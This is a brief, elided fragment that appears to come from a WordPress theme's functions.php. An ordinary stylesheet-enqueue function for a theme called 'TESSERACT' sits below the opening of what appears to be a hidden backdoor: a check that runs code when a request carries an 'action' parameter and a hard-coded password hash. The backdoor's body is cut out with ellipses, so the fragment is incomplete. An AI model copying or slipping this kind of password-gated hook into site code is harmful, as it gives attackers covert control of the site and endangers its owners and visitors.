...
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'ad6fdfdfa3e10bc8917e9b61d6c761e5'))
	{
...
function my_theme_enqueue_styles() {
    wp_enqueue_style( 'TESSERACT', get_template_directory_uri() . '/style.css' );
